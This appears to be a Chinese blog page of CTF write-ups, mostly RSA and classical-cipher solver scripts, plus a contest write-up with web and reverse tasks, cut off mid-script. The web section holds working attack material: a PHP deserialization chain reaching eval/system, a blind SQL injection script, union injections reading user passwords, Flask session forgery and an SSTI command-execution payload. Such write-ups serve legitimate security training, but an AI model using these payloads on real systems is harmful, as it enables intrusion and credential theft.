<h1 id="SWPUCTF-2021-新生赛-crypto1"><a href="#SWPUCTF-2021-新生赛-crypto1" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto1"></a>[SWPUCTF 2021 新生赛]crypto1</h1><pre><code class="python">from  Crypto.Util.number import *
import gmpy2
flag1 = 463634070971821449698012827631572665302589213868521491855038966879005784397309389922926838028598122795187584361359142761652619958273094398420314927073008031088375892957173280915904309949716842152249806486027920136603248454946737961650252641668562626310035983343018705370077783879047584582817271215517599531278507300104564011142229942160380563527291388260832749808727470291331902902518196932928128107067117198707209620169906575791373793854773799564060536121390593687449884988936522369331738199522700261116496965863870682295858957952661531894477603953742494526632841396338388879198270913523572980574440793543571757278020533565628285714358815083303489096524318164071888139412436112963845619981511061231001617406815056986634680975142352197476024575809514978857034477688443230263761729039797859697947454810551009108031457294164840611157524719173343259485881089252938664456637673337362424443150013961181619441267926981848009107466576314685961478748352388452114042115892243272514245081604607798243817586737546663059737344687130881861357423084448027959893402445303299089606081931041217035955143939567456782107203447898345284731038150377722447329202078375870541529539840051415759436083384408203659613313535094343772238691393447475364806171594
flag2 = 130959534275704453216282334815034647265875632781798750901627773826812657339274362406246297925411291822193191483409847323315110393729020700526946712786793380991675008128561863631081095222226285788412970362518398757423705216112313533155390315204875516645459370629706277876211656753247984282379731850770447978537855070379324935282789327428625259945250066774049650951465043700088958965762054418615838049340724639373351248933494355591934236360506778496741051064156771092798005112534162050165095430065000827916096893408569751085550379620558282942254606978819033885539221416335848319082054806148859427713144286777516251724474319613960327799643723278205969253636514684757409059003348229151341200451785288395596484563480261212963114071064979559812327582474674812225260616757099890896900340007990585501470484762752362734968297532533654846190900571017635959385883945858334995884341767905619567505341752047589731815868489295690574109758825021386698440670611361127170896689015108432408490763723594673299472336065575301681055583084547847733168801030191262122130369687497236959760366874106043801542493392227424890925595734150487586757484304609945827925762382889592743709682485229267604771944535469557860120878491329984792448597107256325783346904408
n = 609305637099654478882754880905638123124918364116173050874864700996165096776233155524277418132679727857702738043786588380577485490575591029930152718828075976000078971987922107645530323356525126496562423491563365836491753476840795804040219013880969539154444387313029522565456897962200817021423704204077133003361140660038327458057898764857872645377236870759691588009666047187685654297678987435769051762120388537868493789773766688347724903911796741124237476823452505450704989455260077833828660552130714794889208291939055406292476845194489525212129635173284301782141617878483740788532998492403101324795726865866661786740345862631916793208037250277376942046905892342213663197755010315060990871143919384283302925469309777769989798197913048813940747488087191697903624669415774198027063997058701217124640082074789591591494106726857376728759663074734040755438623372683762856958888826373151815914621262862750497078245369680378038995425628467728412953392359090775734440671874387905724083226246587924716226512631671786591611586774947156657178654343092123117255372954798131265566301316033414311712092913492774989048057650627801991277862963173961355088082419091848569675686058581383542877982979697235829206442087786927939745804017455244315305118437
e1e2 = 3087

for e1 in range(1, (gmpy2.iroot(3087,2)[0])):
    if 3087 % e1 == 0:
        e2 = 3087 // e1
        k, s, t = gmpy2.gcdext(e1,e2)
        m = pow(flag1,s,n) * pow(flag2,t,n) %n
        m = gmpy2.iroot(m, k)[0]
        flag = long_to_bytes(m)
        if b&quot;NSS&quot; in flag:
            print(flag)

</code></pre>
<h1 id="NSSCTF-2022-Spring-Recruit-classic"><a href="#NSSCTF-2022-Spring-Recruit-classic" class="headerlink" title="[NSSCTF 2022 Spring Recruit]classic"></a>[NSSCTF 2022 Spring Recruit]classic</h1><p>先凯撒解出前缀,<code>NSSCTF&#123;NBQXMZK7MFPW42LDMVPXI4TZ_fakeflagtrybase&#125;</code><br>说try base 那么观察前半部分<br>可以发现没有小写字母,应该是base32<br>解得have_a_nice_try<br>于是flag<br><code>NSSCTF&#123;have_a_nice_try&#125;</code></p>
<h1 id="NISACTF-2022-normal"><a href="#NISACTF-2022-normal" class="headerlink" title="[NISACTF 2022]normal"></a>[NISACTF 2022]normal</h1><p>ook<br>unicode<br>base64<br>bubblebabble<br>rot13<br><code>NISA&#123;u_kn0w_wH@t_!_thinK&#125;</code></p>
<h1 id="BJDCTF-2020-EasyRSA"><a href="#BJDCTF-2020-EasyRSA" class="headerlink" title="[BJDCTF 2020]EasyRSA"></a>[BJDCTF 2020]EasyRSA</h1><p>导了一些奇怪的包<br>第一个sympy的<code>Derivative</code>导数<br>第二个<code>fractions </code>分数<br>然后<code>arctan</code>反正切<br><code>arth</code>反双曲正切</p>
<p>看起来很复杂</p>
<p>其实z&#x3D;1 &#x2F; ( 1&#x2F;p^2^ - 1)  - 1 &#x2F; ( 1 - 1&#x2F;q^2^ )<br>即z &#x3D; p^2^ + q^2^<br>故可以求得p,q</p>
<pre><code class="c">from  Crypto.Util.number import *
import gmpy2


c = 7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035
z = 32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482
n = 15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441
e = 65537

p_plus_q_2 = z + 2*n
p_minus_q_2 = z - 2*n
p_plus_q = gmpy2.iroot(p_plus_q_2,2)[0]
p_minus_q = gmpy2.iroot(p_minus_q_2,2)[0]

p = (p_minus_q+p_plus_q) // 2
q = n // p
phi_n = (p-1)*(q-1)

d = gmpy2.invert(e,phi_n)
print(long_to_bytes(pow(c,d,n)))
</code></pre>
<h1 id="AFCTF-2018-Vigenere"><a href="#AFCTF-2018-Vigenere" class="headerlink" title="[AFCTF 2018]Vigenère"></a>[AFCTF 2018]Vigenère</h1><p><code>https://www.guballa.de/vigenere-solver</code>一把梭<br>key: <code>csuwangjiang</code></p>
<p><code>afctf&#123;Whooooooo_U_Gotcha!&#125;</code></p>
<h1 id="UTCTF-2020-basics"><a href="#UTCTF-2020-basics" class="headerlink" title="[UTCTF 2020]basics"></a>[UTCTF 2020]basics</h1><p>第一层base64</p>
<pre><code class="python">from  Crypto.Util.number import *
import gmpy2
import base64

enc = open(&quot;binary.txt&quot;,&quot;rb&quot;).read().decode()
enc_l = enc.split(&quot; &quot;)
enc_l = [&quot;&quot;.join(chr(int(i,2)) for i in enc_l)]
flag = base64.b64decode(enc_l[0].split(&quot;\n&quot;)[1])
print(flag.decode())
</code></pre>
<p>得到<br><code>New challenge! Can you figure out what&#39;s going on here? It looks like the letters are shifted by some constant. (hint: you might want to start looking up Roman people). kvbsqrd, iye&#39;bo kvwycd drobo! Xyg pyb dro psxkv (kxn wkilo dro rkbnocd...) zkbd: k celcdsdedsyx mszrob. Sx dro pyvvygsxq dohd, S&#39;fo dkuox wi wocckqo kxn bozvkmon ofobi kvzrklodsm mrkbkmdob gsdr k mybboczyxnoxmo dy k nsppoboxd mrkbkmdob - uxygx kc k celcdsdedsyx mszrob. Mkx iye psxn dro psxkv pvkq? rsxd: Go uxyg drkd dro pvkq sc qysxq dy lo yp dro pybwkd edpvkq&#123;...&#125; - grsmr wokxc drkd sp iye coo drkd zkddobx, iye uxyg grkd dro mybboczyxnoxmoc pyb e, d, p, v k, kxn q kbo. Iye mkx zbylklvi gybu yed dro bowksxsxq mrkbkmdobc li bozvkmsxq drow kxn sxpobbsxq mywwyx gybnc sx dro Oxqvscr vkxqekqo. Kxydrob qbokd wodryn sc dy eco pboaeoxmi kxkvicsc: go uxyg drkd &#39;o&#39; crygc ez wycd ypdox sx dro kvzrklod, cy drkd&#39;c zbylklvi dro wycd mywwyx mrkbkmdob sx dro dohd, pyvvygon li &#39;d&#39;, kxn cy yx. Yxmo iye uxyg k pog mrkbkmdobc, iye mkx sxpob dro bocd yp dro gybnc lkcon yx mywwyx gybnc drkd cryg ez sx dro Oxqvscr vkxqekqo. rghnxsdfysdtghu! qgf isak cthtuike dik zknthhkx rxqldgnxsliq risyykhnk. ikxk tu s cysn cgx syy qgfx isxe kccgxdu: fdcysn&#123;h0v_di4du_vi4d_t_r4yy_rxqld0&#125;. qgf vtyy cthe disd s ygd gc rxqldgnxsliq tu pfud zftyethn gcc ditu ugxd gc zsutr bhgvykenk, she td xksyyq tu hgd ug zse scdkx syy. iglk qgf khpgqke dik risyykhnk!</code><br>第二层Vigenère<br>得到<br><code>alright, you&#39;re almost there! Now for the final (and maybe the hardest...) part: a substitution cipher. In the following text, I&#39;ve taken my message and replaced every alphabetic character with a correspondence to a different character - known as a substitution cipher. Can you find the final flag? hint: We know that the flag is going to be of the format utflag&#123;...&#125; - which means that if you see that pattern, you know what the correspondences for u, t, f, l a, and g are. You can probably work out the remaining characters by replacing them and inferring common words in the English language. Another great method is to use frequency analysis: we know that &#39;e&#39; shows up most often in the alphabet, so that&#39;s probably the most common character in the text, followed by &#39;t&#39;, and so on. Once you know a few characters, you can infer the rest of the words based on common words that show up in the English language. hwxdnitvoitjwxk! gwv yiqa sjxjkyau tya padjxxan hngbtwdnibyg hyiooaxda. yana jk i soid swn ioo gwvn yinu asswntk: vtsoid&#123;x0l_ty4tk_ly4t_j_h4oo_hngbt0&#125;. gwv ljoo sjxu tyit i owt ws hngbtwdnibyg jk fvkt pvjoujxd wss tyjk kwnt ws pikjh rxwloauda, ixu jt naioog jk xwt kw piu istan ioo. ywba gwv axfwgau tya hyiooaxda!</code><br>第三层单表替换,这里用词频分析<br><code>https://quipqiup.com/</code><br>得到<br><code>congratulations! you have finished the beginner cryptography challenge. here is a flag for all your hard efforts: utflag&#123;n0w_th4ts_wh4t_i_c4ll_crypt0&#125;. you will find that a lot of cryptography is just building off this sort of basic knowledge, and it really is not so bad after all. hope you enjoyed the challenge! </code></p>
<h1 id="BJDCTF-2020-rsa-output"><a href="#BJDCTF-2020-rsa-output" class="headerlink" title="[BJDCTF 2020]rsa_output"></a>[BJDCTF 2020]rsa_output</h1><p>两组nc<br>共模</p>
<pre><code class="c">from  Crypto.Util.number import *
import gmpy2

n = 21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111
e1 = 2767
e2 = 3659
c1 = 20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599
c2 = 11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227

k, s, t = gmpy2.gcdext(e1,e2)
m = pow(c1,s,n) * pow(c2,t,n) % n
m = gmpy2.iroot(m,k)[0]
print(long_to_bytes(m))
</code></pre>
<h1 id="NSSCTF-2022-Spring-Recruit-Vigenere"><a href="#NSSCTF-2022-Spring-Recruit-Vigenere" class="headerlink" title="[NSSCTF 2022 Spring Recruit]Vigenere"></a>[NSSCTF 2022 Spring Recruit]Vigenere</h1><p>key: <code>bestkasscn</code></p>
<h1 id="LitCTF-2023-梦想是红色的-初级"><a href="#LitCTF-2023-梦想是红色的-初级" class="headerlink" title="[LitCTF 2023]梦想是红色的 (初级)"></a>[LitCTF 2023]梦想是红色的 (初级)</h1><p>社会主义核心价值观解码</p>
<h1 id="NISACTF-2022-sign-crypto"><a href="#NISACTF-2022-sign-crypto" class="headerlink" title="[NISACTF 2022]sign_crypto"></a>[NISACTF 2022]sign_crypto</h1><p><code>https://www.latexlive.com/home</code><br><img src="https://img-blog.csdnimg.cn/a906bac994ca4ef6891046f43b078efb.png" alt="在这里插入图片描述"><br>藏头<br><code>NSSCTF&#123;EDIT_WITH_LATEX&#125;</code></p>
<h1 id="WUSTCTF-2020-佛说：只能四天"><a href="#WUSTCTF-2020-佛说：只能四天" class="headerlink" title="[WUSTCTF 2020]佛说：只能四天"></a>[WUSTCTF 2020]佛说：只能四天</h1><p>新佛曰<br>社会主义核心价值观<br>rail_fence 长度为4,这里一开始用cyberchef死活出不了,才知道cyberchef是w型的,或者有不是w型的我没找到<br>然后凯撒 解base32<br><img src="https://img-blog.csdnimg.cn/43ae1629a7204b468bcce7120ef14bef.png" alt="在这里插入图片描述"></p>
<h1 id="LitCTF-2023-Hex？Hex！-初级"><a href="#LitCTF-2023-Hex？Hex！-初级" class="headerlink" title="[LitCTF 2023]Hex？Hex！(初级)"></a>[LitCTF 2023]Hex？Hex！(初级)</h1><p>long_to_bytes</p>
<h1 id="HGAME-2022-week3-RSA-attack-3"><a href="#HGAME-2022-week3-RSA-attack-3" class="headerlink" title="[HGAME 2022 week3]RSA attack 3"></a>[HGAME 2022 week3]RSA attack 3</h1><pre><code class="python">from rsaAttack import rsaATTACK
import gmpy2
from Crypto.Util.number import *
n = 507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759
e = 77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095
c = 165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224
rsaATTACK.winer_attack(e,n)
p = 21298134770649658216278142296112942067147983199869944051655637057817328935819182610235462542569498569324385324409329571639600371299301899356824248143642344655442622374410310055425324677795784348676565914255070769153686678958926694461277211055311525634376131602446021339153829749451964653889079995884358945519072510825015936448152457479593557483201584178529677963719663775436340988624581240903410405998043378783910544890698820131277542597734306033931291895554315374634997718205759853380739243270624315403363705348247791948363494335781877752324962632628092187671413785054077812783546897087918010783689638260926706015913
q = 23824582553942919630850676220178643109001733415361353537841839392299606064996415886803838233068147964855219400175482264280732424187869450981451906986725084796308595805826699938124497098907397768965741168302469271928272998228311113517190888598629379930432525787072020418255919390290574878929953914018136149954421947488032931942930949955884293721160202632663062911194952115007125088928249982623306322013786936529425393146129275358939088606061079593543727354390310264157278935888913107901772969741480470747454297764934781325875916543539488214337064926875838879522936754363794195722196675211558559735431886185759667481543

d = gmpy2.invert(e,(p-1)*(q-1))
print(long_to_bytes(pow(c,d,n)))
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/python/" style="color: #00a596">python</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/java/" style="color: #03a9f4">java</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/javascript/" style="color: #00a596">javascript</a>
        </span>
        
    </div>
    <a href="/2023/05/22/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(1)/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/16/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%20%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E8%B5%9B%E5%89%8D%E6%A8%A1%E6%8B%9F%E9%A2%98%E9%83%A8%E5%88%86wp/">
        <h2 class="post-title">2023宁波市赛 天一永安杯赛前模拟题部分wp</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/16
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>进hint.php</p>
<p>伪协议读index.php</p>
<pre><code class="php">&lt;?php
class Tiger&#123;
    public $string;
    protected $var;// 恶意参数
    public function __construct($var)&#123;
        $this-&gt;var = $var;
    &#125;
    public function __toString()&#123;
        return $this-&gt;string;
    &#125;
    public function boss($value)&#123;// 0
        @eval($value);
    &#125;
    public function __invoke()&#123;// 1
        $this-&gt;boss($this-&gt;var);
    &#125;
&#125;

class Lion&#123;
    public $tail;
    public function __construct()&#123;
        $this-&gt;tail = array();
    &#125;
    public function __get($value)&#123;
        $function = $this-&gt;tail;
        return $function(); // 2
    &#125;
&#125;


class Monkey&#123;
    public $head;
    public $hand;
    public function __construct($here=&quot;Zoo&quot;)&#123;
        $this-&gt;head = $here;
        echo &quot;Welcome to &quot;.$this-&gt;head.&quot;&lt;br&gt;&quot;;
    &#125;
    public function __wakeup()&#123;//0
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;head)) &#123;
            echo &quot;hacker&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        &#125;
    &#125;
&#125;

class Elephant&#123;
    public $nose;
    public $nice;
    public function __construct($nice=&quot;nice&quot;)&#123;// 4
        $this-&gt;nice = $nice;
        echo $nice;
    &#125;
    public function __toString()&#123;
        return $this-&gt;nice-&gt;nose;// 3
    &#125;
&#125;

if(isset($_POST[&#39;zoo&#39;]))&#123;
    @unserialize($_POST[&#39;zoo&#39;]);
&#125;
$pop = new Monkey();
$E = new Elephant();
$pop -&gt; head = $E;
$L = new Lion();
$L -&gt; tail = new Tiger(&quot;system(&#39;tac /f14g&#39;);&quot;);
$E -&gt; nice = $L;
$a = urlencode(serialize($pop));
echo &quot;\n&quot;;
echo $a;
// unserialize(urldecode($a));

//O%3A6%3A%22Monkey%22%3A2%3A%7Bs%3A4%3A%22head%22%3BO%3A8%3A%22Elephant%22%3A2%3A%7Bs%3A4%3A%22nose%22%3BN%3Bs%3A4%3A%22nice%22%3BO%3A4%3A%22Lion%22%3A1%3A%7Bs%3A4%3A%22tail%22%3BO%3A5%3A%22Tiger%22%3A2%3A%7Bs%3A6%3A%22string%22%3BN%3Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A20%3A%22system%28%27tac+%2Ff14g%27%29%3B%22%3B%7D%7D%7Ds%3A4%3A%22hand%22%3BN%3B%7D
</code></pre>
<h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p>注释都给过滤了,我一开始没注意,费老半天劲不知道在干什么</p>
<p>然后直接闭合1’or 1&#x3D;’1可以回显</p>
<p>这里一开始就想着盲注了,后来才发现union也可以</p>
<pre><code class="python">import string
import requests
url = &#39;http://040bac98a927037e.node.nsctf.cn/index.php?id=1&#39;
dic = string.ascii_letters+string.digits+&#39;&#125;&#123;-,_&#39;
xxx = &#39;&#39;
for i in range(1,666):
    
    flag = True
    print(&quot;正在注入第&#123;&#125;位&quot;.format(i))
    for j in dic:
        # payload = &quot;&#39;/**/%26%26if(substr(database(),&#123;&#125;,1)=binary&#39;&#123;&#125;&#39;,1,0)%26%26/**/1=/**/&#39;1&quot;.format(i,j)
        payload = &quot;&#39;/**/%26%26if(substr((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics_with_buffer),&#123;&#125;,1)=binary&#39;&#123;&#125;&#39;,1,0)%26%26/**/1=/**/&#39;1&quot;.format(i,j)
        res = requests.get(url=url+payload)
        if &#39;的人名字叫bob&#39; in res.text:
            xxx += j
            flag = False
    print(xxx)
    if flag:
        print(xxx)
        break

    # 数据库 web2
    # 表 atable flag users sys_config
</code></pre>
<p>过滤information了</p>
<p>得无列名注入</p>
<pre><code class="sql">-1&#39;union/**/select/**/1,(select/**/`1`/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/flag)a/**/limit/**/1,1),3&#39;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/542a56c3392f40fe543a5d6915763027.png" alt="image-20230512203144268"></p>
<p>读账号</p>
<pre><code class="sql">-1&#39;union/**/select/**/1,(select/**/`1`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3&#39; 
</code></pre>
<p>读密码</p>
<pre><code class="sql">-1&#39;union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3&#39;
</code></pre>
<p>进login.php登录就拿到flag了</p>
<h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p>一开始以为ssti,试半天发现怎样都不能注入</p>
<p>扫目录</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/10ace8a6ee383402d7bd5232bb818b52.png" alt="image-20230508204705520"></p>
<pre><code class="python">source in /source&quot;
        return rsp


@app.route(&#39;/source&#39;)
def source():
    f = open(__file__, &#39;r&#39;)
    rsp = f.read()
    f.close()
    return rsp[rsp.index(&#39;source&#39;):]


@app.route(&#39;/admin&#39;)
def admin_handler():
    try:
        role = session.get(&#39;role&#39;)
        if not isinstance(role, dict):
            raise Exception
    except Exception:
        return &#39;~~~~~~hacker!&#39;
    if role.get(&#39;is_admin&#39;) == 1:
        flag = role.get(&#39;flag&#39;) or &#39;admin&#39;
        flag = filter(flag)
        message = &quot;%s, I hope you have a good time!your flag is &quot; % flag
        return render_template_string(message)
    else:
        return &quot;I don&#39;t know you&quot;


if __name__ == &#39;__main__&#39;:
    app.run(&#39;0.0.0.0&#39;, port=80)

</code></pre>
<p>进admin session伪造</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9549d474c8b37f33f395f09cfcbdaa10.png" alt="image-20230508204809301"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cbde36a7934a143ae2dec4f160b4ecac.png" alt="image-20230508205422970"></p>
<p><code>eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJuYW1lIjoidGVzdCIsInNlY3JldF9rZXkiOiJWR2d4YzBCdmJtVWhjMlZEY21WMElRPT0ifX0.ZFjw1A.zbhScChV5emlcs855_qO2RnToVQ</code></p>
<p>然后此处存在ssti</p>
<p>payload如下</p>
<img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202305082144662.png" alt="image-20230508214448619"  />

<pre><code>eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJmbGFnIjoie3tsaXBzdW0uX19nbG9iYWxzX18ub3MucG9wZW4oJ2NkIC4uO2NhdCBmKicpLnJlYWQoKX19In19.ZFj8cQ._J4XAqO3oSWZR9tf9q-p2MDJCzY
</code></pre>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ezcal"><a href="#ezcal" class="headerlink" title="ezcal"></a>ezcal</h2><p>rsa数学推导</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6bc596191cef93ffc28e2900ac471609.png" alt="image-20230508210500587"></p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Empathy"><a href="#Empathy" class="headerlink" title="Empathy"></a>Empathy</h2><p>核心代码</p>
<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  char Str2[64]; // [rsp+20h] [rbp-60h] BYREF
  char Str1[256]; // [rsp+60h] [rbp-20h] BYREF
  char Str[256]; // [rsp+160h] [rbp+E0h] BYREF
  int v7; // [rsp+260h] [rbp+1E0h]
  int k; // [rsp+264h] [rbp+1E4h]
  int j; // [rsp+268h] [rbp+1E8h]
  int i; // [rsp+26Ch] [rbp+1ECh]

  sub_401D30(argc, argv, envp);
  puts(&amp;Buffer);
  printf(&amp;Format);
  memset(Str, 0, sizeof(Str));
  memset(Str1, 0, sizeof(Str1));
  scanf(&quot;%s&quot;, Str);
  v7 = strlen(Str);
  if ( v7 != 38 )
  &#123;
    printf(&amp;byte_40504D);
    exit(0);
  &#125;
  for ( i = 0; i &lt; v7; ++i )
    Str[i] = ~Str[i];
  for ( j = 0; j &lt;= 99; ++j )
  &#123;
    sub_401550(&amp;Str[(j + 5) % v7], &amp;Str[(j + 2) % v7]);
    sub_401550(&amp;Str[(j + 1) % v7], &amp;Str[(j + 7) % v7]);
    sub_401550(&amp;Str[(j + 3) % v7], &amp;Str[(j + 10) % v7]);
    sub_401550(&amp;Str[(j + 8) % v7], &amp;Str[(j + 9) % v7]);
  &#125;
  sub_401588(Str, Str1, 0i64);
  Str2[0] = 51;
  Str2[1] = 102;
  Str2[2] = 39;
  Str2[3] = 60;
  Str2[4] = 39;
  Str2[5] = 45;
  Str2[6] = 40;
  Str2[7] = 18;
  Str2[8] = 36;
  Str2[9] = 107;
  Str2[10] = 109;
  Str2[11] = 17;
  Str2[12] = 36;
  Str2[13] = 61;
  Str2[14] = 113;
  Str2[15] = 25;
  Str2[16] = 48;
  Str2[17] = 4;
  Str2[18] = 39;
  Str2[19] = 4;
  Str2[20] = 36;
  Str2[21] = 19;
  Str2[22] = 43;
  Str2[23] = 60;
  Str2[24] = 38;
  Str2[25] = 45;
  Str2[26] = 109;
  Str2[27] = 21;
  Str2[28] = 51;
  Str2[29] = 107;
  Str2[30] = 104;
  Str2[31] = 61;
  Str2[32] = 38;
  Str2[33] = 45;
  Str2[34] = 63;
  Str2[35] = 7;
  Str2[36] = 39;
  Str2[37] = 107;
  Str2[38] = 105;
  Str2[39] = 18;
  Str2[40] = 53;
  Str2[41] = 106;
  Str2[42] = 18;
  Str2[43] = 21;
  Str2[44] = 51;
  Str2[45] = 7;
  Str2[46] = 13;
  Str2[47] = 59;
  Str2[48] = 51;
  Str2[49] = 45;
  Str2[50] = 7;
  Str2[51] = 99;
  for ( k = 0; k &lt;= 51; ++k )
    Str2[k] ^= 0x5Eu;
  if ( !strcmp(Str1, Str2) )
    printf(&amp;byte_405060);
  else
    printf(&amp;byte_405081);
  return 0;
&#125;
</code></pre>
<p>解密脚本</p>
<pre><code class="python">import base64
Str = []
Str.append(51)
Str.append(102)
Str.append(39)
Str.append(60)
Str.append(39)
Str.append(45)
Str.append(40)
Str.append(18)
Str.append(36)
Str.append(107)
Str.append(109)
Str.append(17)
Str.append(36)
Str.append(61)
Str.append(113)
Str.append(25)
Str.append(48)
Str.append(4)
Str.append(39)
Str.append(4)
Str.append(36)
Str.append(19)
Str.append(43)
Str.append(60)
Str.append(38)
Str.append(45)
Str.append(109)
Str.append(21)
Str.append(51)
Str.append(107)
Str.append(104)
Str.append(61)
Str.append(38)
Str.append(45)
Str.append(63)
Str.append(7)
Str.append(39)
Str.append(107)
Str.append(105)
Str.append(18)
Str.append(53)
Str.append(106)
Str.append(18)
Str.append(21)
Str.append(51)
Str.append(7)
Str.append(13)
Str.append(59)
Str.append(51)
Str.append(45)
Str.append(7)
Str.append(99)
res = &#39;&#39;
v7 = 38

